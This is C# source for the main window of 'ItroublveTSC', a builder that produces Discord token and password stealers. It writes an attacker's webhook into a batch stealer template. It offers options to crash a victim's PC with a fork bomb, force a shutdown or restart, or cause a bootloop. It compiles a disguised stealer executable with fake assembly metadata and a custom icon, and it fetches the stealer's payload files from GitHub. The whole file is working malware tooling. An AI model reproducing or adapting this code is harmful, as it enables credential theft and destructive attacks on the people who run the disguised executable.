using DiscordFlooder.Class.Design.Rainbow;
using RaidAPI.StealToken;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using ItroublveTSC2;
using System.Runtime.CompilerServices;

namespace ItroublveTSC
{
    public partial class frmMain : Form
    {
        #region GUI
        public frmMain()
        {
            this.InitializeComponent();
            this.RainbowTimer.Start();
        }
        private void RainbowTimer_Tick(object sender, EventArgs e)
        {
            Rainbow.RainbowEffect();
            this.pnlRainbowTop.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
            this.PnlRainbowDown.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
            this.pictureBox1.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
        }
        #endregion
        #region Checks
        private void frmMain_Load(object sender, EventArgs e)
        {
            if (Directory.Exists("bin_copy"))
            {
                Directory.Delete("bin_copy", true);
            }
            frmMain.ICON = false;
        }
        #endregion
        #region Create stealer files
        private void CreateBtn_Click(object sender, EventArgs e)
        {
            bool flag = this.WebHookTxt.Text == "" || this.WebHookTxt.Text == "Webhook Here";
            if (flag)
            {
                MessageBox.Show("You need to paste a Webhook first!", "ItroublveTSC");
            }
            else
            {
                string _TokenStealer = "TokenStealer.bin";
                string _cdDir = "output";
                string _CopyTokenStealer = "TokenStealerCOPY.bin";
                if (Directory.Exists(_cdDir))
                {
                    Directory.Delete(_cdDir, true);
                }
                try
                {
                    if (!File.Exists(_CopyTokenStealer))
                    {
                        File.Copy(_TokenStealer, _CopyTokenStealer);
                    }
                    string text = File.ReadAllText("TokenStealerCOPY.bin");
                    if (CrashPCchkbox.Checked)
                    {
                        text = text.Replace("rem %0 | %0", "%0 | %0");
                    }
                    if (RestartPCchkbox.Checked)
                    {
                        text = text.Replace("rem SHUTDOWN -r -t 30", "SHUTDOWN -r -t 30");
                    }
                    if (ShutdownPCchkbox.Checked)
                    {
                        text = text.Replace("rem SHUTDOWN /s /t 30 /c", "SHUTDOWN /s /t 30 /c");
                    }
                    if (BootloopPCchckbox.Checked)
                    {
                        text = text.Replace("rem test", "");
                    }
                    text = text.Replace("Webhook", WebHookTxt.Text);
                    File.WriteAllText("TokenStealerCopy.bin", text);
                    DirectoryInfo di = Directory.CreateDirectory(_cdDir);
                    File.Move(_CopyTokenStealer, "output/Token Stealer.bat");
                    File.Delete(_CopyTokenStealer);
                    Stealer.Dialog(this.WebHookTxt.Text);
                    MessageBox.Show("Stealer files successfully created!", "ItroublveTSC");
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Failed to create stealer files!\r\n" + (ex.Message),"ItroublveTSC");
                }

            }
        }
        #endregion
        #region closebtn
        private void CloseBtn_Click(object sender, EventArgs e)
        {
            if (File.Exists("TokenStealerCOPY.bin"))
            {
                File.Delete("TokenStealerCOPY.bin");
            }
            if (Directory.Exists("bin_copy"))
            {
                Directory.Delete("bin_copy", true);
            }
            Environment.Exit(0);
        }
        #endregion
        #region Useful Junk
        private void HeadServerLbl_MouseDown(object sender, MouseEventArgs e)
        {
            Mouse.x = Control.MousePosition.X - base.Location.X;
            Mouse.y = Control.MousePosition.Y - base.Location.Y;
        }
        private void HeadServerLbl_MouseMove(object sender, MouseEventArgs e)
        {
            bool flag = e.Button == MouseButtons.Left;
            if (flag)
            {
                Mouse.newpoint = Control.MousePosition;
                Mouse.newpoint.X = Mouse.newpoint.X - Mouse.x;
                Mouse.newpoint.Y = Mouse.newpoint.Y - Mouse.y;
                base.Location = Mouse.newpoint;
            }
        }
        public static bool ICON { get; private set; }
        #endregion
        #region Compile changes to EXE
        private void roundBtn1_Click(object sender, EventArgs e)
        {
            bool flag = this.FinalresbatTxt.Text == "" || this.FinalresbatTxt.Text == "Token Stealer.bat Link Here";
            bool flag1 = this.SendhookfileTxt.Text == "" || this.SendhookfileTxt.Text == "Sendhookfile.exe Link Here";
            bool flag2 = this.AssemblyTitleTxt.Text == "" || this.AssemblyTitleTxt.Text == "Assembly Title Here";
            bool flag3 = this.AssemblyDescTxt.Text == "" || this.AssemblyDescTxt.Text == "Assembly Description Here";
            bool flag4 = this.AssemblyProdTxt.Text == "" || this.AssemblyProdTxt.Text == "Assembly Product Here";
            bool flag5 = this.AssemblyCopyrTxt.Text == "" || this.AssemblyCopyrTxt.Text == "Assembly © Copyright";
            bool flag6 = this.AssemblyFileVTxt.Text == "" || this.AssemblyFileVTxt.Text == "File Version";
            if (flag)
            {
                MessageBox.Show("You need to paste a link to Token stealer.bat!", "ItroublveTSC");
            }
            if (flag1)
            {
                MessageBox.Show("You need to paste a link to Sendhookfile.exe!", "ItroublveTSC");
            }
            else
            {
                try
                {
                    string path = @"bin_copy";
                    if (!Directory.Exists(path))
                    {
                        string test = @"bin";
                        string test2 = @"bin_copy";
                        Copy(test, test2);
					}
                    string text3 = File.ReadAllText(@"bin_copy/TOKEN STEALER CREATOR.csproj");
                    string text = File.ReadAllText(@"bin_copy/Program.cs");
                    string text2 = File.ReadAllText(@"bin_copy/Properties/AssemblyInfo.cs");
                    text = text.Replace("finalresbatch", this.FinalresbatTxt.Text);
                    text = text.Replace("sendhookfile", this.SendhookfileTxt.Text);
                    if (flag2)
                    {
                        text2 = text2.Replace("titel", "");
                        text3 = text3.Replace("TOKEN STEALER CREATOR", "I don't know my name!");
                    }
                    else
                    {
                        text2 = text2.Replace("titel", AssemblyTitleTxt.Text);
                        text3 = text3.Replace("TOKEN_STEALER_CREATOR", AssemblyTitleTxt.Text);
                        text3 = text3.Replace("TOKEN STEALER CREATOR", AssemblyTitleTxt.Text);
                    }
                    if (flag3)
                    {
                        text2 = text2.Replace("deskription", "");
                    }
                    else
                    {
                        text2 = text2.Replace("deskription", AssemblyDescTxt.Text);
                    }
                    if (flag4)
                    {
                        text2 = text2.Replace("produkt", "");
                    }
                    else
                    {
                        text2 = text2.Replace("produkt", AssemblyProdTxt.Text);
                    }
                    if (flag5)
                    {
                        text2 = text2.Replace("rightcopy", "");
                    }
                    else
                    {
                        text2 = text2.Replace("rightcopy", AssemblyCopyrTxt.Text);
                    }
                    if (!flag6)
                    {
                        text2 = text2.Replace("1.0.0.0", AssemblyFileVTxt.Text);
                    }
                    if (AutoRmvExe.Checked)
                    {
                        text = text.Replace("//RemoveEXE", "RemoveEXE");
                    }
                    if (CustomEXEchkbox.Checked)
                    {
                        text = text.Replace("customexelink", CustomExeTxt.Text);
                        text = text.Replace("/*", "");
                        text = text.Replace("*/", "");
                    }
                    File.WriteAllText(@"bin_copy/Program.cs", text);
                    File.WriteAllText(@"bin_copy/Properties/AssemblyInfo.cs", text2);
                    File.WriteAllText(@"bin_copy/TOKEN STEALER CREATOR.csproj", text3);

                    Process.Start(new ProcessStartInfo()
                    {
                        Arguments = "/C C:/Windows/Microsoft.NET/Framework/v4.0.30319/msbuild.exe bin_copy/TSC.sln",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        FileName = "cmd.exe"
                    });
                    Thread.Sleep(7000);
                }
                catch
                {
                    DialogResult dialogResult = MessageBox.Show("bin folder or files inside missing or modified!\r\n" + "Want to download bin files from Github?", "ItroublveTSC", MessageBoxButtons.YesNo);
                    if (dialogResult == DialogResult.Yes)
                    {
                        string _cdDir = Path.GetDirectoryName(Application.ExecutablePath) + "/bin";
                        DirectoryInfo di = Directory.CreateDirectory(_cdDir);
                        using (WebClient webClient = new WebClient())
                            webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/5.0/AVOID%20ME/bin.zip?raw=true", "bin/Token Stealer Creator.zip");
                        ZipFile.ExtractToDirectory(_cdDir + "/Token Stealer Creator.zip", _cdDir);
                        File.Delete(_cdDir + "/Token Stealer Creator.zip");
                        MessageBox.Show("bin files has been downloaded successfully.\r\nItroublveTSC will now close, please relauch to create stealer!", "ItroublveTSC");
                        Environment.Exit(0);
                    }
                    else if (dialogResult == DialogResult.No)
                    {
                        MessageBox.Show("OK. FINE THEN. I WILL CLOSE MYSELF!", "ItroublveTSC");
                        Environment.Exit(0);
                    }
                }
                try
                {
                    string path2 = "Token Stealer.exe";
                    string folderPath = "bin_copy";
                    if (File.Exists(path2))
                    {
                        File.Delete(path2);
                    }
                    Process.Start(new ProcessStartInfo()
                    {
                        Arguments = "/C move \".\\bin_copy\\bin\\Debug\\*.exe\" \"Token Stealer.exe\"",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        FileName = "cmd.exe",
                    });
                    Thread.Sleep(3000);
                    Directory.Delete(folderPath, true);
                    if (File.Exists(path2))
                    {
                        MessageBox.Show("Token Stealer.exe successfully compiled!", "ItroublveTSC");
                    }
                    else
                    {
                        if (frmMain.ICON)
                        {
                            if (MessageBox.Show("The ICO wasn't converted correctly.\r\n" +
                                "Do you want to convert right now, again?", "ItroublveTSC", MessageBoxButtons.YesNo) == DialogResult.Yes)
                            {
                                Process.Start("https://convertico.com/");
                            }
                        }
                        else
                        {
                            if (MessageBox.Show("Failed to create stealer;" +
                                "\r\nMake sure you have .NET framework and try again.\r\nWant to get in touch?", "ItroublveTSC", MessageBoxButtons.YesNoCancel) == DialogResult.Yes)
                            {
                                Process.Start("https://itroublvehacker.ml/howtousev5");
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Failed to create token stealer.\r\nTake a look below to know reason!\r\n" + (ex.Message), "ItroublveTSC");
                }
            }
        }
        #endregion
        #region "How to use" Button
        private void roundBtn1_Click_1(object sender, EventArgs e)
        {
            try
            {
                Process.Start("https://itroublvehacker.ml/howtousev5");
            }
            catch(Exception ex)
            {
                MessageBox.Show("Failed to open" + "How To Use\r\n" + (ex.Message), "ItroublveTSC");
            }
        }
        #endregion
        #region Enable/Disable textbox
        private void CustomEXEchkbox_CheckedChanged(object sender, EventArgs e)
        {
            if (CustomEXEchkbox.Checked)
            {
                CustomExeTxt.Enabled = true;
            }
            else
            {
                CustomExeTxt.Enabled = false;
            }
        }
        #endregion
        #region Put Icon
        private void roundBtn2_Click(object sender, EventArgs e)
        {
            if (!File.Exists("bin_copy/Program.cs"))
            {
                string test = @"bin";
                string test2 = @"bin_copy";
                Copy(test, test2);
            }
            var fileContent = string.Empty;
            var filePath = string.Empty;

            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.InitialDirectory = ".\\";
                openFileDialog.Filter = "ICO files (*.ico)|*.ico";
                openFileDialog.FilterIndex = 2;
                openFileDialog.RestoreDirectory = true;

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        filePath = openFileDialog.FileName;


                        var fileStream = openFileDialog.OpenFile();

                        using (StreamReader reader = new StreamReader(fileStream))
                        {
                            fileContent = reader.ReadToEnd();
                        }
                        string text = File.ReadAllText(@"bin_copy/TOKEN STEALER CREATOR.csproj");
                        text = text.Replace("<!--", "");
                        text = text.Replace("-->", "");
                        text = text.Replace("YourICON", filePath);
                        File.WriteAllText(@"bin_copy/TOKEN STEALER CREATOR.csproj", text);
                        IconPrePic.Image = new Bitmap(filePath);
                        frmMain.ICON = true;
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("An error occured, Please send a screenshot of this below to; Itroublve Hacker...\r\n" +
                            (ex), "ItroublveTSC");
                    }
                }
                else
                {
                    MessageBox.Show("ICO not added.\r\n" +
                        "Canceled by user", "ItroublveTSC");
                }
            }
        }
        #endregion

        private void roundBtn3_Click(object sender, EventArgs e)
        {
            frm2 fm = new frm2();
            fm.ShowDialog();
        }
        #region Placeholder
        private void WebHookTxt_Enter(object sender, EventArgs e)
        {
            if (WebHookTxt.Text == "Webhook Here")
            {
                WebHookTxt.Text = "";
            }
        }

        private void WebHookTxt_Leave(object sender, EventArgs e)
        {
            if (WebHookTxt.Text == "")
            {
                WebHookTxt.Text = "Webhook Here";
            }
        }

        private void FinalresbatTxt_Enter(object sender, EventArgs e)
        {
            if (FinalresbatTxt.Text == "Token Stealer.bat Link Here")
            {
                FinalresbatTxt.Text = "";
            }
        }

        private void FinalresbatTxt_Leave(object sender, EventArgs e)
        {
            if (FinalresbatTxt.Text == "")
            {
                FinalresbatTxt.Text = "Token Stealer.bat Link Here";
            }
        }

        private void SendhookfileTxt_Enter(object sender, EventArgs e)
        {
            if (SendhookfileTxt.Text == "Sendhookfile.exe Link Here")
            {
                SendhookfileTxt.Text = "";
            }
        }

        private void SendhookfileTxt_Leave(object sender, EventArgs e)
        {
            if (SendhookfileTxt.Text == "")
            {
                SendhookfileTxt.Text = "Sendhookfile.exe Link Here";
            }
        }

        private void CustomExeTxt_Enter(object sender, EventArgs e)
        {
            if (CustomExeTxt.Text == "Custom EXE Link Here")
            {
                CustomExeTxt.Text = "";
            }
        }

        private void CustomExeTxt_Leave(object sender, EventArgs e)
        {
            if (CustomExeTxt.Text == "")
            {
                CustomExeTxt.Text = "Custom EXE Link Here";
            }
        }

        private void AssemblyTitleTxt_Enter(object sender, EventArgs e)
        {
            if (AssemblyTitleTxt.Text == "Assembly Title Here")
            {
                AssemblyTitleTxt.Text = "";
            }
        }

        private void AssemblyTitleTxt_Leave(object sender, EventArgs e)
        {
            if (AssemblyTitleTxt.Text == "")
            {
                AssemblyTitleTxt.Text = "Assembly Title Here";
            }
        }

        private void AssemblyDescTxt_Enter(object sender, EventArgs e)
        {
            if (AssemblyDescTxt.Text == "Assembly Description Here")
            {
                AssemblyDescTxt.Text = "";
            }
        }

        private void AssemblyDescTxt_Leave(object sender, EventArgs e)
        {
            if (AssemblyDescTxt.Text == "")
            {
                AssemblyDescTxt.Text = "Assembly Description Here";
            }
        }

        private void AssemblyProdTxt_Enter(object sender, EventArgs e)
        {
            if (AssemblyProdTxt.Text == "Assembly Product Here")
            {
                AssemblyProdTxt.Text = "";
            }
        }

        private void AssemblyProdTxt_Leave(object sender, EventArgs e)
        {
            if (AssemblyProdTxt.Text == "")
            {
                AssemblyProdTxt.Text = "Assembly Product Here";
            }
        }

        private void AssemblyCopyrTxt_Enter(object sender, EventArgs e)
        {
            if (AssemblyCopyrTxt.Text == "Assembly © Copyright")
            {
                AssemblyCopyrTxt.Text = "";
            }
        }

        private void AssemblyCopyrTxt_Leave(object sender, EventArgs e)
        {
            if (AssemblyCopyrTxt.Text == "")
            {
                AssemblyCopyrTxt.Text = "Assembly © Copyright";
            }
        }
        #endregion
        #region COPY
        public static void Copy(string sourceDirectory, string targetDirectory)
        {
            var diSource = new DirectoryInfo(sourceDirectory);
            var diTarget = new DirectoryInfo(targetDirectory);

            CopyAll(diSource, diTarget);
        }

        public static void CopyAll(DirectoryInfo source, DirectoryInfo target)
        {
            Directory.CreateDirectory(target.FullName);

            // Copy each file into the new directory.
            foreach (FileInfo fi in source.GetFiles())
            {
                Console.WriteLine(@"Copying {0}\{1}", target.FullName, fi.Name);
                fi.CopyTo(Path.Combine(target.FullName, fi.Name), true);
            }

            // Copy each subdirectory using recursion.
            foreach (DirectoryInfo diSourceSubDir in source.GetDirectories())
            {
                DirectoryInfo nextTargetSubDir =
                    target.CreateSubdirectory(diSourceSubDir.Name);
                CopyAll(diSourceSubDir, nextTargetSubDir);
            }
        }
        #endregion copy 
    }
}
